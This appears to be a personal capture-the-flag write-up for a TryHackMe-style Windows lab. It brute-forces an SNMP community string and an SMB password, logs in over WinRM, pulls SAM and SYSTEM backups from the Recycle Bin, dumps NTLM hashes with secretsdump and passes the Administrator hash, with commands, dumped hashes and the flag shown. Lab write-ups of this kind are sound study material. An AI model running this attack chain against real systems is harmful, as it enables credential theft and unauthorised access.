info.md

1. get the community string:

```
onesixtyone $ip -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt > onesixtyone.txt

#communitystring in this case was openview
```

2. dump the information or snmp:

```

# Dump all info:

snmp-check -c <community-string> <target-ip>

# or use snmp-walk. the default location of username list is: 1.3.6.1.4.1.77.1.2.25:

snmpwalk -c <COMMUNITY> -v1 <MACHINE-IP> 1.3.6.1.4.1.77.1.2.25

#snmpwalk didn't work in this case. don't know why


#we found the user Jareth
```


3. Let's bruteforce SMB:

```
#
crackmapexec smb 10.201.23.225 -u Jareth -p /usr/share/wordlists/rockyou.txt

Found the password: sarah

the password could be found/guessed using OSINT - search Jareth. 
#
```

4. 

```powershell
# Try it to use the creds to connect to winrm
evil-winrm -u Jareth -i 10.201.23.225 -p 

```

# -----------------
Priv-escalation
# --------


-get SID

>>> whoami /all

S-1-5-21-1987495829-1628902820-919763334-1001


check the recyclebin

>>>cd 'C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'



evil-winrm has a download command for just this purpose. Unfortunately, it won’t work when they’re in the Recycling Bin, so we first copy them to a temp location:

```
copy sam.bak C:\Users\Jareth\Desktop\sam.bak
copy system.bak C:\Users\Jareth\Desktop\system.bak
cd C:\Users\Jareth\Desktop
download sam.bak
download system.bak
```

Dump the hashes:

>>>  impacket-secretsdump -sam sam.bak -system system.bak local


[*] Target system bootKey: 0xd676472afd9cc13ac271e26890b87a8c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::
Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::
[*] Cleaning up... 
--------

# pass the hash

>>> evil-winrm -u Administrator -i 10.201.23.225 -H 6bc99ede9edcfecf9662fb0c0ddcfa7a


get the ..../desktop/admin.txt: THM{YWFjZTM1MjFiZmRiODgyY2UwYzZlZWM2}

-------- 

#TODO:

- What' SID
- Add this escalation priv method to obsidian
- what's sam.bak and system.bak files
- how to use impacket tools without impacket-
- why aad3b435b51404eeaad3b435b51404ee hash means empty
- document the escalation priv method
- read other write ups
